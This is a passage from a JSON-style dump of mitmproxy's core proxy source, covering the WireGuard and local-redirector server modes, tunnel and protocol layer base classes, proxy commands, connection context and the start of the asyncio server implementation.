  self.server_key = c[\"server_key\"]\n            self.client_key = c[\"client_key\"]\n        except Exception as e:\n            raise ValueError(f\"Invalid configuration file ({conf_path}): {e}\") from e\n        # error early on invalid keys\n        p = mitmproxy_rs.pubkey(self.client_key)\n        _ = mitmproxy_rs.pubkey(self.server_key)\n\n        self._server = await mitmproxy_rs.start_wireguard_server(\n            host or \"0.0.0.0\",\n            port,\n            self.server_key,\n            [p],\n            self.wg_handle_stream,\n            self.wg_handle_stream,\n        )\n\n        conf = self.client_conf()\n        assert conf\n        logger.info(\"-\" * 60 + \"\\n\" + conf + \"\\n\" + \"-\" * 60)\n\n    def client_conf(self) -> str | None:\n        if not self._server:\n            return None\n        host = (\n            self.mode.listen_host(ctx.options.listen_host)\n            or local_ip.get_local_ip()\n            or local_ip.get_local_ip6()\n        )\n        port = self.mode.listen_port(ctx.options.listen_port)\n        return textwrap.dedent(\n            f\"\"\"\n            [Interface]\n            PrivateKey = {self.client_key}\n            Address = 10.0.0.1/32\n            DNS = 10.0.0.53\n\n            [Peer]\n            PublicKey = {mitmproxy_rs.pubkey(self.server_key)}\n            AllowedIPs = 0.0.0.0/0\n            Endpoint = {host}:{port}\n            \"\"\"\n        ).strip()\n\n    def to_json(self) -> dict:\n        return {\"wireguard_conf\": self.client_conf(), **super().to_json()}\n\n    async def _stop(self) -> None:\n        assert self._server is not None\n        try:\n            self._server.close()\n            await self._server.wait_closed()\n        finally:\n            self._server = None\n\n    async def wg_handle_stream(\n        self, stream: mitmproxy_rs.Stream\n    ) -> None:  # pragma: no cover on platforms without wg-test-client\n        await self.handle_stream(stream, stream)\n\n\nclass LocalRedirectorInstance(ServerInstance[mode_specs.LocalMode]):\n    _server: ClassVar[mitmproxy_rs.LocalRedirector | None] = None\n    \"\"\"The local redirector daemon. Will be started once and then reused for all future instances.\"\"\"\n    _instance: ClassVar[LocalRedirectorInstance | None] = None\n    \"\"\"The current LocalRedirectorInstance. Will be unset again if an instance is stopped.\"\"\"\n    listen_addrs = ()\n\n    @property\n    def is_running(self) -> bool:\n        return self._instance is not None\n\n    def make_top_layer(self, context: Context) -> Layer:\n        return layers.modes.TransparentProxy(context)\n\n    @classmethod\n    async def redirector_handle_stream(\n        cls,\n        stream: mitmproxy_rs.Stream,\n    ) -> None:\n        if cls._instance is not None:\n            await cls._instance.handle_stream(stream, stream)\n\n    async def _start(self) -> None:\n        if self._instance:\n            raise RuntimeError(\"Cannot spawn more than one local redirector.\")\n\n        if self.mode.data.startswith(\"!\"):\n            spec = f\"{self.mode.data},{os.getpid()}\"\n        elif self.mode.data:\n            spec = self.mode.data\n        else:\n            spec = f\"!{os.getpid()}\"\n\n        cls = self.__class__\n        cls._instance = self  # assign before awaiting to avoid races\n        if cls._server is None:\n            try:\n                cls._server = await mitmproxy_rs.start_local_redirector(\n                    cls.redirector_handle_stream,\n                    cls.redirector_handle_stream,\n                )\n            except Exception:\n                cls._instance = None\n                raise\n\n        cls._server.set_intercept(spec)\n\n    async def _stop(self) -> None:\n        assert self._instance\n        assert self._server\n        self.__class__._instance = None\n        # We're not shutting down the server because we want to avoid additional UAC prompts.\n        self._server.set_intercept(\"\")\n\n\nclass RegularInstance(AsyncioServerInstance[mode_specs.RegularMode]):\n    def make_top_layer(self, context: Context) -> Layer:\n        return layers.modes.HttpProxy(context)\n\n\nclass UpstreamInstance(AsyncioServerInstance[mode_specs.UpstreamMode]):\n    def make_top_layer(self, context: Context) -> Layer:\n        return layers.modes.HttpUpstreamProxy(context)\n\n\nclass TransparentInstance(AsyncioServerInstance[mode_specs.TransparentMode]):\n    def make_top_layer(self, context: Context) -> Layer:\n        return layers.modes.TransparentProxy(context)\n\n\nclass ReverseInstance(AsyncioServerInstance[mode_specs.ReverseMode]):\n    def make_top_layer(self, context: Context) -> Layer:\n        return layers.modes.ReverseProxy(context)\n\n\nclass Socks5Instance(AsyncioServerInstance[mode_specs.Socks5Mode]):\n    def make_top_layer(self, context: Context) -> Layer:\n        return layers.modes.Socks5Proxy(context)\n\n\nclass DnsInstance(AsyncioServerInstance[mode_specs.DnsMode]):\n    def make_top_layer(self, context: Context) -> Layer:\n        return layers.DNSLayer(context)\n\n\n# class Http3Instance(AsyncioServerInstance[mode_specs.Http3Mode]):\n#     def make_top_layer(self, context: Context) -> Layer:\n#         return layers.modes.HttpProxy(context)\n", "mitmproxy/proxy/utils.py": "\"\"\"\nUtility decorators that help build state machines\n\"\"\"\n\nimport functools\n\nfrom mitmproxy.proxy import events\n\n\ndef expect(*event_types):\n    \"\"\"\n    Only allow the given event type.\n    If another event is passed, an AssertionError is raised.\n    \"\"\"\n\n    def decorator(f):\n        if __debug__ is True:\n\n            @functools.wraps(f)\n            def _check_event_type(self, event: events.Event):\n                if isinstance(event, event_types):\n                    return f(self, event)\n                else:\n                    event_types_str = (\n                        \"|\".join(e.__name__ for e in event_types) or \"no events\"\n                    )\n                    raise AssertionError(\n                        f\"Unexpected event type at {f.__qualname__}: \"\n                        f\"Expected {event_types_str}, got {event}.\"\n                    )\n\n            return _check_event_type\n        else:  # pragma: no cover\n            return f\n\n    return decorator\n\n\nclass ReceiveBuffer:\n    \"\"\"\n    A data structure to collect stream contents efficiently in O(n).\n    \"\"\"\n\n    _chunks: list[bytes]\n    _len: int\n\n    def __init__(self):\n        self._chunks = []\n        self._len = 0\n\n    def __iadd__(self, other: bytes):\n        assert isinstance(other, bytes)\n        self._chunks.append(other)\n        self._len += len(other)\n        return self\n\n    def __len__(self):\n        return self._len\n\n    def __bytes__(self):\n        return b\"\".join(self._chunks)\n\n    def __bool__(self):\n        return self._len > 0\n\n    def clear(self):\n        self._chunks.clear()\n        self._len = 0\n", "mitmproxy/proxy/tunnel.py": "import time\nfrom enum import auto\nfrom enum import Enum\nfrom typing import Union\n\nfrom mitmproxy import connection\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import context\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.layer import Layer\n\n\nclass TunnelState(Enum):\n    INACTIVE = auto()\n    ESTABLISHING = auto()\n    OPEN = auto()\n    CLOSED = auto()\n\n\nclass TunnelLayer(layer.Layer):\n    \"\"\"\n    A specialized layer that simplifies the implementation of tunneling protocols such as SOCKS, upstream HTTP proxies,\n    or TLS.\n    \"\"\"\n\n    child_layer: layer.Layer\n    tunnel_connection: connection.Connection\n    \"\"\"The 'outer' connection which provides the tunnel protocol I/O\"\"\"\n    conn: connection.Connection\n    \"\"\"The 'inner' connection which provides data I/O\"\"\"\n    tunnel_state: TunnelState = TunnelState.INACTIVE\n    command_to_reply_to: commands.OpenConnection | None = None\n    _event_queue: list[events.Event]\n    \"\"\"\n    If the connection already exists when we receive the start event,\n    we buffer commands until we have established the tunnel.\n    \"\"\"\n\n    def __init__(\n        self,\n        context: context.Context,\n        tunnel_connection: connection.Connection,\n        conn: connection.Connection,\n    ):\n        super().__init__(context)\n        self.tunnel_connection = tunnel_connection\n        self.conn = conn\n        self.child_layer = layer.NextLayer(self.context)\n        self._event_queue = []\n\n    def __repr__(self):\n        return f\"{type(self).__name__}({self.tunnel_state.name.lower()})\"\n\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, events.Start):\n            if self.tunnel_connection.state is not connection.ConnectionState.CLOSED:\n                # we might be in the interesting state here where the connection is already half-closed,\n                # for example because next_layer buffered events and the client disconnected in the meantime.\n                # we still expect a close event to arrive, so we carry on here as normal for now.\n                self.tunnel_state = TunnelState.ESTABLISHING\n                yield from self.start_handshake()\n            yield from self.event_to_child(event)\n        elif (\n            isinstance(event, events.ConnectionEvent)\n            and event.connection == self.tunnel_connection\n        ):\n            if isinstance(event, events.DataReceived):\n                if self.tunnel_state is TunnelState.ESTABLISHING:\n                    done, err = yield from self.receive_handshake_data(event.data)\n                    if done:\n                        if self.conn != self.tunnel_connection:\n                            self.conn.state = connection.ConnectionState.OPEN\n                            self.conn.timestamp_start = time.time()\n                    if err:\n                        if self.conn != self.tunnel_connection:\n                            self.conn.state = connection.ConnectionState.CLOSED\n                            self.conn.timestamp_start = time.time()\n                        yield from self.on_handshake_error(err)\n                    if done or err:\n                        yield from self._handshake_finished(err)\n                else:\n                    yield from self.receive_data(event.data)\n            elif isinstance(event, events.ConnectionClosed):\n                if self.conn != self.tunnel_connection:\n                    self.conn.state &= ~connection.ConnectionState.CAN_READ\n                    self.conn.timestamp_end = time.time()\n                if self.tunnel_state is TunnelState.OPEN:\n                    yield from self.receive_close()\n                elif self.tunnel_state is TunnelState.ESTABLISHING:\n                    err = \"connection closed\"\n                    yield from self.on_handshake_error(err)\n                    yield from self._handshake_finished(err)\n                self.tunnel_state = TunnelState.CLOSED\n            else:  # pragma: no cover\n                raise AssertionError(f\"Unexpected event: {event}\")\n        else:\n            yield from self.event_to_child(event)\n\n    def _handshake_finished(self, err: str | None) -> layer.CommandGenerator[None]:\n        if err:\n            self.tunnel_state = TunnelState.CLOSED\n        else:\n            self.tunnel_state = TunnelState.OPEN\n        if self.command_to_reply_to:\n            yield from self.event_to_child(\n                events.OpenConnectionCompleted(self.command_to_reply_to, err)\n            )\n            self.command_to_reply_to = None\n        else:\n            for evt in self._event_queue:\n                yield from self.event_to_child(evt)\n            self._event_queue.clear()\n\n    def _handle_command(\n        self, command: commands.Command\n    ) -> layer.CommandGenerator[None]:\n        if (\n            isinstance(command, commands.ConnectionCommand)\n            and command.connection == self.conn\n        ):\n            if isinstance(command, commands.SendData):\n                yield from self.send_data(command.data)\n            elif isinstance(command, commands.CloseConnection):\n                if self.conn != self.tunnel_connection:\n                    self.conn.state &= ~connection.ConnectionState.CAN_WRITE\n                    command.connection = self.tunnel_connection\n                yield from self.send_close(command)\n            elif isinstance(command, commands.OpenConnection):\n                # create our own OpenConnection command object that blocks here.\n                self.command_to_reply_to = command\n                self.tunnel_state = TunnelState.ESTABLISHING\n                err = yield commands.OpenConnection(self.tunnel_connection)\n                if err:\n                    yield from self.event_to_child(\n                        events.OpenConnectionCompleted(command, err)\n                    )\n                    self.tunnel_state = TunnelState.CLOSED\n                else:\n                    yield from self.start_handshake()\n            else:  # pragma: no cover\n                raise AssertionError(f\"Unexpected command: {command}\")\n        else:\n            yield command\n\n    def event_to_child(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if (\n            self.tunnel_state is TunnelState.ESTABLISHING\n            and not self.command_to_reply_to\n        ):\n            self._event_queue.append(event)\n            return\n        for command in self.child_layer.handle_event(event):\n            yield from self._handle_command(command)\n\n    def start_handshake(self) -> layer.CommandGenerator[None]:\n        yield from self._handle_event(events.DataReceived(self.tunnel_connection, b\"\"))\n\n    def receive_handshake_data(\n        self, data: bytes\n    ) -> layer.CommandGenerator[tuple[bool, str | None]]:\n        \"\"\"returns a (done, err) tuple\"\"\"\n        yield from ()\n        return True, None\n\n    def on_handshake_error(self, err: str) -> layer.CommandGenerator[None]:\n        \"\"\"Called if either receive_handshake_data returns an error or we receive a close during handshake.\"\"\"\n        yield commands.CloseConnection(self.tunnel_connection)\n\n    def receive_data(self, data: bytes) -> layer.CommandGenerator[None]:\n        yield from self.event_to_child(events.DataReceived(self.conn, data))\n\n    def receive_close(self) -> layer.CommandGenerator[None]:\n        yield from self.event_to_child(events.ConnectionClosed(self.conn))\n\n    def send_data(self, data: bytes) -> layer.CommandGenerator[None]:\n        yield commands.SendData(self.tunnel_connection, data)\n\n    def send_close(\n        self, command: commands.CloseConnection\n    ) -> layer.CommandGenerator[None]:\n        yield command\n\n\nclass LayerStack:\n    def __init__(self) -> None:\n        self._stack: list[Layer] = []\n\n    def __getitem__(self, item: int) -> Layer:\n        return self._stack.__getitem__(item)\n\n    def __truediv__(self, other: Union[Layer, \"LayerStack\"]) -> \"LayerStack\":\n        if isinstance(other, Layer):\n            if self._stack:\n                self._stack[-1].child_layer = other  # type: ignore\n            self._stack.append(other)\n        else:\n            if self._stack:\n                self._stack[-1].child_layer = other[0]  # type: ignore\n            self._stack.extend(other._stack)\n        return self\n", "mitmproxy/proxy/layer.py": "\"\"\"\nBase class for protocol layers.\n\"\"\"\n\nimport collections\nimport textwrap\nfrom abc import abstractmethod\nfrom collections.abc import Callable\nfrom collections.abc import Generator\nfrom dataclasses import dataclass\nfrom logging import DEBUG\nfrom typing import Any\nfrom typing import ClassVar\nfrom typing import NamedTuple\nfrom typing import TypeVar\n\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy.commands import Command\nfrom mitmproxy.proxy.commands import StartHook\nfrom mitmproxy.proxy.context import Context\n\nT = TypeVar(\"T\")\nCommandGenerator = Generator[Command, Any, T]\n\"\"\"\nA function annotated with CommandGenerator[bool] may yield commands and ultimately return a boolean value.\n\"\"\"\n\n\nMAX_LOG_STATEMENT_SIZE = 512\n\"\"\"Maximum size of individual log statements before they will be truncated.\"\"\"\n\n\nclass Paused(NamedTuple):\n    \"\"\"\n    State of a layer that's paused because it is waiting for a command reply.\n    \"\"\"\n\n    command: commands.Command\n    generator: CommandGenerator\n\n\nclass Layer:\n    \"\"\"\n    The base class for all protocol layers.\n\n    Layers interface with their child layer(s) by calling .handle_event(event),\n    which returns a list (more precisely: a generator) of commands.\n    Most layers do not implement .directly, but instead implement ._handle_event, which\n    is called by the default implementation of .handle_event.\n    The default implementation of .handle_event allows layers to emulate blocking code:\n    When ._handle_event yields a command that has its blocking attribute set to True, .handle_event pauses\n    the execution of ._handle_event and waits until it is called with the corresponding CommandCompleted event.\n    All events encountered in the meantime are buffered and replayed after execution is resumed.\n\n    The result is code that looks like blocking code, but is not blocking:\n\n        def _handle_event(self, event):\n            err = yield OpenConnection(server)  # execution continues here after a connection has been established.\n\n    Technically this is very similar to how coroutines are implemented.\n    \"\"\"\n\n    __last_debug_message: ClassVar[str] = \"\"\n    context: Context\n    _paused: Paused | None\n    \"\"\"\n    If execution is currently paused, this attribute stores the paused coroutine\n    and the command for which we are expecting a reply.\n    \"\"\"\n    _paused_event_queue: collections.deque[events.Event]\n    \"\"\"\n    All events that have occurred since execution was paused.\n    These will be replayed to ._child_layer once we resume.\n    \"\"\"\n    debug: str | None = None\n    \"\"\"\n    Enable debug logging by assigning a prefix string for log messages.\n    Different amounts of whitespace for different layers work well.\n    \"\"\"\n\n    def __init__(self, context: Context) -> None:\n        self.context = context\n        self.context.layers.append(self)\n        self._paused = None\n        self._paused_event_queue = collections.deque()\n\n        show_debug_output = getattr(context.options, \"proxy_debug\", False)\n        if show_debug_output:  # pragma: no cover\n            self.debug = \"  \" * len(context.layers)\n\n    def __repr__(self):\n        statefun = getattr(self, \"state\", self._handle_event)\n        state = getattr(statefun, \"__name__\", \"\")\n        state = state.replace(\"state_\", \"\")\n        if state == \"_handle_event\":\n            state = \"\"\n        else:\n            state = f\"state: {state}\"\n        return f\"{type(self).__name__}({state})\"\n\n    def __debug(self, message):\n        \"\"\"yield a Log command indicating what message is passing through this layer.\"\"\"\n        if len(message) > MAX_LOG_STATEMENT_SIZE:\n            message = message[:MAX_LOG_STATEMENT_SIZE] + \"\u2026\"\n        if Layer.__last_debug_message == message:\n            message = message.split(\"\\n\", 1)[0].strip()\n            if len(message) > 256:\n                message = message[:256] + \"\u2026\"\n        else:\n            Layer.__last_debug_message = message\n        assert self.debug is not None\n        return commands.Log(textwrap.indent(message, self.debug), DEBUG)\n\n    @property\n    def stack_pos(self) -> str:\n        \"\"\"repr() for this layer and all its parent layers, only useful for debugging.\"\"\"\n        try:\n            idx = self.context.layers.index(self)\n        except ValueError:\n            return repr(self)\n        else:\n            return \" >> \".join(repr(x) for x in self.context.layers[: idx + 1])\n\n    @abstractmethod\n    def _handle_event(self, event: events.Event) -> CommandGenerator[None]:\n        \"\"\"Handle a proxy server event\"\"\"\n        yield from ()  # pragma: no cover\n\n    def handle_event(self, event: events.Event) -> CommandGenerator[None]:\n        if self._paused:\n            # did we just receive the reply we were waiting for?\n            pause_finished = (\n                isinstance(event, events.CommandCompleted)\n                and event.command is self._paused.command\n            )\n            if self.debug is not None:\n                yield self.__debug(f\"{'>>' if pause_finished else '>!'} {event}\")\n            if pause_finished:\n                assert isinstance(event, events.CommandCompleted)\n                yield from self.__continue(event)\n            else:\n                self._paused_event_queue.append(event)\n        else:\n            if self.debug is not None:\n                yield self.__debug(f\">> {event}\")\n            command_generator = self._handle_event(event)\n            send = None\n\n            # inlined copy of __process to reduce call stack.\n            # <\u2702\u2702\u2702>\n            try:\n                # Run ._handle_event to the next yield statement.\n                # If you are not familiar with generators and their .send() method,\n                # https://stackoverflow.com/a/12638313/934719 has a good explanation.\n                command = command_generator.send(send)\n            except StopIteration:\n                return\n\n            while True:\n                if self.debug is not None:\n                    if not isinstance(command, commands.Log):\n                        yield self.__debug(f\"<< {command}\")\n                if command.blocking is True:\n                    # We only want this layer to block, the outer layers should not block.\n                    # For example, take an HTTP/2 connection: If we intercept one particular request,\n                    # we don't want all other requests in the connection to be blocked a well.\n                    # We signal to outer layers that this command is already handled by assigning our layer to\n                    # `.blocking` here (upper layers explicitly check for `is True`).\n                    command.blocking = self\n                    self._paused = Paused(\n                        command,\n                        command_generator,\n                    )\n                    yield command\n                    return\n                else:\n                    yield command\n                    try:\n                        command = next(command_generator)\n                    except StopIteration:\n                        return\n            # </\u2702\u2702\u2702>\n\n    def __process(self, command_generator: CommandGenerator, send=None):\n        \"\"\"\n        Yield commands from a generator.\n        If a command is blocking, execution is paused and this function returns without\n        processing any further commands.\n        \"\"\"\n        try:\n            # Run ._handle_event to the next yield statement.\n            # If you are not familiar with generators and their .send() method,\n            # https://stackoverflow.com/a/12638313/934719 has a good explanation.\n            command = command_generator.send(send)\n        except StopIteration:\n            return\n\n        while True:\n            if self.debug is not None:\n                if not isinstance(command, commands.Log):\n                    yield self.__debug(f\"<< {command}\")\n            if command.blocking is True:\n                # We only want this layer to block, the outer layers should not block.\n                # For example, take an HTTP/2 connection: If we intercept one particular request,\n                # we don't want all other requests in the connection to be blocked a well.\n                # We signal to outer layers that this command is already handled by assigning our layer to\n                # `.blocking` here (upper layers explicitly check for `is True`).\n                command.blocking = self\n                self._paused = Paused(\n                    command,\n                    command_generator,\n                )\n                yield command\n                return\n            else:\n                yield command\n                try:\n                    command = next(command_generator)\n                except StopIteration:\n                    return\n\n    def __continue(self, event: events.CommandCompleted):\n        \"\"\"\n        Continue processing events after being paused.\n        The tricky part here is that events in the event queue may trigger commands which again pause the execution,\n        so we may not be able to process the entire queue.\n        \"\"\"\n        assert self._paused is not None\n        command_generator = self._paused.generator\n        self._paused = None\n        yield from self.__process(command_generator, event.reply)\n\n        while not self._paused and self._paused_event_queue:\n            ev = self._paused_event_queue.popleft()\n            if self.debug is not None:\n                yield self.__debug(f\"!> {ev}\")\n            command_generator = self._handle_event(ev)\n            yield from self.__process(command_generator)\n\n\nmevents = (\n    events  # alias here because autocomplete above should not have aliased version.\n)\n\n\nclass NextLayer(Layer):\n    layer: Layer | None\n    \"\"\"The next layer. To be set by an addon.\"\"\"\n\n    events: list[mevents.Event]\n    \"\"\"All events that happened before a decision was made.\"\"\"\n\n    _ask_on_start: bool\n\n    def __init__(self, context: Context, ask_on_start: bool = False) -> None:\n        super().__init__(context)\n        self.context.layers.remove(self)\n        self.layer = None\n        self.events = []\n        self._ask_on_start = ask_on_start\n        self._handle: Callable[[mevents.Event], CommandGenerator[None]] | None = None\n\n    def __repr__(self):\n        return f\"NextLayer:{repr(self.layer)}\"\n\n    def handle_event(self, event: mevents.Event):\n        if self._handle is not None:\n            yield from self._handle(event)\n        else:\n            yield from super().handle_event(event)\n\n    def _handle_event(self, event: mevents.Event):\n        self.events.append(event)\n\n        # We receive new data. Let's find out if we can determine the next layer now?\n        if self._ask_on_start and isinstance(event, events.Start):\n            yield from self._ask()\n        elif (\n            isinstance(event, mevents.ConnectionClosed)\n            and event.connection == self.context.client\n        ):\n            # If we have not determined the next protocol yet and the client already closes the connection,\n            # we abort everything.\n            yield commands.CloseConnection(self.context.client)\n        elif isinstance(event, mevents.DataReceived):\n            # For now, we only ask if we have received new data to reduce hook noise.\n            yield from self._ask()\n\n    def _ask(self):\n        \"\"\"\n        Manually trigger a next_layer hook.\n        The only use at the moment is to make sure that the top layer is initialized.\n        \"\"\"\n        yield NextLayerHook(self)\n\n        # Has an addon decided on the next layer yet?\n        if self.layer:\n            if self.debug:\n                yield commands.Log(f\"{self.debug}[nextlayer] {self.layer!r}\", DEBUG)\n            for e in self.events:\n                yield from self.layer.handle_event(e)\n            self.events.clear()\n\n            # Why do we need three assignments here?\n            #  1. When this function here is invoked we may have paused events. Those should be\n            #     forwarded to the sublayer right away, so we reassign ._handle_event.\n            #  2. This layer is not needed anymore, so we directly reassign .handle_event.\n            #  3. Some layers may however still have a reference to the old .handle_event.\n            #     ._handle is just an optimization to reduce the callstack in these cases.\n            self.handle_event = self.layer.handle_event  # type: ignore\n            self._handle_event = self.layer.handle_event  # type: ignore\n            self._handle = self.layer.handle_event\n\n    # Utility methods for whoever decides what the next layer is going to be.\n    def data_client(self):\n        return self._data(self.context.client)\n\n    def data_server(self):\n        return self._data(self.context.server)\n\n    def _data(self, connection: Connection):\n        data = (\n            e.data\n            for e in self.events\n            if isinstance(e, mevents.DataReceived) and e.connection == connection\n        )\n        return b\"\".join(data)\n\n\n@dataclass\nclass NextLayerHook(StartHook):\n    \"\"\"\n    Network layers are being switched. You may change which layer will be used by setting data.layer.\n\n    (by default, this is done by mitmproxy.addons.NextLayer)\n    \"\"\"\n\n    data: NextLayer\n", "mitmproxy/proxy/commands.py": "\"\"\"\nCommands make it possible for layers to communicate with the \"outer world\",\ne.g. to perform IO or to ask the master.\nA command is issued by a proxy layer and is then passed upwards to the proxy server, and from there\npossibly to the master and addons.\n\nThe counterpart to commands are events.\n\"\"\"\n\nimport logging\nimport warnings\nfrom typing import TYPE_CHECKING\nfrom typing import Union\n\nimport mitmproxy.hooks\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.connection import Server\n\nif TYPE_CHECKING:\n    import mitmproxy.proxy.layer\n\n\nclass Command:\n    \"\"\"\n    Base class for all commands\n    \"\"\"\n\n    blocking: Union[bool, \"mitmproxy.proxy.layer.Layer\"] = False\n    \"\"\"\n    Determines if the command blocks until it has been completed.\n    For practical purposes, this attribute should be thought of as a boolean value,\n    layers may swap out `True` with a reference to themselves to signal to outer layers\n    that they do not need to block as well.\n\n    Example:\n\n        reply = yield Hook(\"requestheaders\", flow)  # blocking command\n        yield Log(\"hello world\", \"info\")            # non-blocking\n    \"\"\"\n\n    def __repr__(self):\n        x = self.__dict__.copy()\n        x.pop(\"blocking\", None)\n        return f\"{type(self).__name__}({repr(x)})\"\n\n\nclass RequestWakeup(Command):\n    \"\"\"\n    Request a `Wakeup` event after the specified amount of seconds.\n    \"\"\"\n\n    delay: float\n\n    def __init__(self, delay: float):\n        self.delay = delay\n\n\nclass ConnectionCommand(Command):\n    \"\"\"\n    Commands involving a specific connection\n    \"\"\"\n\n    connection: Connection\n\n    def __init__(self, connection: Connection):\n        self.connection = connection\n\n\nclass SendData(ConnectionCommand):\n    \"\"\"\n    Send data to a remote peer\n    \"\"\"\n\n    data: bytes\n\n    def __init__(self, connection: Connection, data: bytes):\n        super().__init__(connection)\n        self.data = data\n\n    def __repr__(self):\n        target = str(self.connection).split(\"(\", 1)[0].lower()\n        return f\"SendData({target}, {self.data!r})\"\n\n\nclass OpenConnection(ConnectionCommand):\n    \"\"\"\n    Open a new connection\n    \"\"\"\n\n    connection: Server\n    blocking = True\n\n\nclass CloseConnection(ConnectionCommand):\n    \"\"\"\n    Close a connection. If the client connection is closed,\n    all other connections will ultimately be closed during cleanup.\n    \"\"\"\n\n\nclass CloseTcpConnection(CloseConnection):\n    half_close: bool\n    \"\"\"\n    If True, only close our half of the connection by sending a FIN packet.\n    This is required from some protocols which close their end to signal completion and then continue reading,\n    for example HTTP/1.0 without Content-Length header.\n    \"\"\"\n\n    def __init__(self, connection: Connection, half_close: bool = False):\n        super().__init__(connection)\n        self.half_close = half_close\n\n\nclass StartHook(Command, mitmproxy.hooks.Hook):\n    \"\"\"\n    Start an event hook in the mitmproxy core.\n    This triggers a particular function (derived from the class name) in all addons.\n    \"\"\"\n\n    name = \"\"\n    blocking = True\n\n    def __new__(cls, *args, **kwargs):\n        if cls is StartHook:\n            raise TypeError(\"StartHook may not be instantiated directly.\")\n        return super().__new__(cls, *args, **kwargs)\n\n\nclass Log(Command):\n    \"\"\"\n    Log a message.\n\n    Layers could technically call `logging.log` directly, but the use of a command allows us to\n    write more expressive playbook tests. Put differently, by using commands we can assert that\n    a specific log message is a direct consequence of a particular I/O event.\n    This could also be implemented with some more playbook magic in the future,\n    but for now we keep the current approach as the fully sans-io one.\n    \"\"\"\n\n    message: str\n    level: int\n\n    def __init__(\n        self,\n        message: str,\n        level: int = logging.INFO,\n    ):\n        if isinstance(level, str):  # pragma: no cover\n            warnings.warn(\n                \"commands.Log() now expects an integer log level, not a string.\",\n                DeprecationWarning,\n                stacklevel=2,\n            )\n            level = getattr(logging, level.upper())\n        self.message = message\n        self.level = level\n\n    def __repr__(self):\n        return f\"Log({self.message!r}, {logging.getLevelName(self.level).lower()})\"\n", "mitmproxy/proxy/__init__.py": "\"\"\"\nThis module contains mitmproxy's core network proxy.\n\nThe most important primitives are:\n\n    - Layers: represent protocol layers, e.g. one for TCP, TLS, and so on. Layers are nested, so\n      a typical configuration might be ReverseProxy/TLS/TCP.\n      Most importantly, layers are implemented using the sans-io pattern (https://sans-io.readthedocs.io/).\n      This means that calls return immediately, there is no blocking sync or async code.\n    - Server: the proxy server handles all I/O. This is implemented using `asyncio`, but could be done any other way.\n      The `ConnectionHandler` is subclassed in the `Proxyserver` addon, which handles the communication with the\n      rest of mitmproxy.\n    - Events: When I/O actions occur at the proxy server, they are passed to the outermost layer as events,\n      e.g. `DataReceived` or `ConnectionClosed`.\n    - Commands: In the other direction, layers can emit commands to higher layers or the proxy server.\n      This is used to e.g. send data, request for new connections to be opened, or to call mitmproxy's\n      event hooks.\n    - Context: The context is the connection context each layer is provided with, which is always a client connection\n      and sometimes also a server connection.\n\"\"\"\n", "mitmproxy/proxy/context.py": "from typing import TYPE_CHECKING\n\nfrom mitmproxy import connection\nfrom mitmproxy.options import Options\n\nif TYPE_CHECKING:\n    import mitmproxy.proxy.layer\n\n\nclass Context:\n    \"\"\"\n    The context object provided to each protocol layer in the proxy core.\n    \"\"\"\n\n    client: connection.Client\n    \"\"\"The client connection.\"\"\"\n    server: connection.Server\n    \"\"\"\n    The server connection.\n\n    For practical reasons this attribute is always set, even if there is not server connection yet.\n    In this case the server address is `None`.\n    \"\"\"\n    options: Options\n    \"\"\"\n    Provides access to options for proxy layers. Not intended for use by addons, use `mitmproxy.ctx.options` instead.\n    \"\"\"\n    layers: list[\"mitmproxy.proxy.layer.Layer\"]\n    \"\"\"\n    The protocol layer stack.\n    \"\"\"\n\n    def __init__(\n        self,\n        client: connection.Client,\n        options: Options,\n    ) -> None:\n        self.client = client\n        self.options = options\n        self.server = connection.Server(\n            address=None, transport_protocol=client.transport_protocol\n        )\n        self.layers = []\n\n    def fork(self) -> \"Context\":\n        ret = Context(self.client, self.options)\n        ret.server = self.server\n        ret.layers = self.layers.copy()\n        return ret\n\n    def __repr__(self):\n        return (\n            f\"Context(\\n\"\n            f\"  {self.client!r},\\n\"\n            f\"  {self.server!r},\\n\"\n            f\"  layers=[{self.layers!r}]\\n\"\n            f\")\"\n        )\n", "mitmproxy/proxy/server.py": "\"\"\"\nProxy Server Implementation using asyncio.\nThe very high level overview is as follows:\n\n    - Spawn one coroutine per client connection and create a reverse proxy layer to example.com\n    - Process any commands from layer (such as opening a server connection)\n    - Wait for any IO and send it as events to top layer.\n\"\"\"\n\nimport abc\nimport asyncio\nimport collections\nimport logging\nimport time\nfrom collections.abc import Awaitable\nfrom collections.abc import Callable\nfrom collections.abc import MutableMapping\nfrom contextlib import contextmanager\nfrom dataclasses import dataclass\nfrom types import TracebackType\nfrom typing import Literal\n\nimport mitmproxy_rs\nfrom OpenSSL import SSL\n\nfrom mitmproxy import http\nfrom mitmproxy import options as moptions\nfrom mitmproxy import tls\nfrom mitmproxy.connection import Address\nfrom mitmproxy.connection import Client\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.connection import ConnectionState\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy import layers\nfrom mitmproxy.proxy import mode_specs\nfrom mitmproxy.proxy import server_hooks\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.layers.http import HTTPMode\nfrom mitmproxy.utils import asyncio_utils\nfrom mitmproxy.utils import human\nfrom mitmproxy.utils.data import pkg_data\n\nlogger = logging.getLogger(__name__)\n\nTCP_TIMEOUT = 60 * 10\nUDP_TIMEOUT = 20\n\n\nclass TimeoutWatchdog:\n    last_activity: float\n    timeout: int\n    can_timeout: asyncio.Event\n    blocker: int\n\n    def __init__(self, timeout: int, callback: Callable[[], Awaitable]):\n        self.timeout = timeout\n        self.callback = callback\n        self.last_activity = time.time()\n        self.can_timeout = asyncio.Event()\n        self.can_timeout.set()\n        self.blocker = 0\n\n    def register_activity(self):\n        self.last_activity = time.time()\n\n    async def watch(self):\n        try:\n            while True:\n                await self.can_timeout.wait()\n                await asyncio.sleep(self.timeout - (time.time() - self.last_activity))\n                if self.last_activity + self.timeout < time.time():\n                    await self.callback()\n                    return\n        except asyncio.CancelledError:\n            return\n\n    @contextmanager\n    def disarm(self):\n        self.can_timeout.clear()\n        self.blocker += 1\n        try:\n            yield\n        finally:\n            self.blocker -= 1\n            if self.blocker == 0:\n                